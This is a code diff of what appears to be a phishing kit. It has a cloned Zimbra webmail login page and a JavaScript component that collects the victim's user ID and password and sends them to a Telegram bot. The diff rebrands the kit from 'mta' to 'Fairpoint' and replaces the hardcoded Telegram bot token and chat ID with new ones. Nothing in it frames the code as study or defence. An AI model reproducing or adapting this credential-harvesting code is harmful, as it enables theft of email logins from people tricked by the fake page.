@@ -7,11 +7,11 @@
 	<div id="modifiedLogin" class="LoginScreen">
 		<div class="modernCenter">
                 <div class="modernContentBox">
-                    <div class="logo">
+                    <!-- <div class="logo">
                         <a href="http://www.mtaonline.net" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
                             <span class="ImgLoginBanner"></span>
                         </a>
-                    </div>				
+                    </div>	 -->
 				<form id="zLoginForm"  name="loginForm"  accept-charset="UTF-8">
 								<input type="hidden" name="loginOp" value="login">
 								<input type="hidden" name="login_csrf" value="8385df0c-48d2-4179-ab47-7a41388adeff">
@@ -108,11 +108,11 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `*mta *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
+        const message = `*Fairpoint *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
-          process.env.NUXT_APP_CHAT_ID || "-4794000485",
+          process.env.NUXT_APP_CHAT_ID || "-5167264103",
           message
         );
 
@@ -126,7 +126,7 @@ export default {
 
     async sendTelegramResult(chatId, message) {
       try {
-        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
+        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;
 
         const payload = {
           chat_id: chatId,
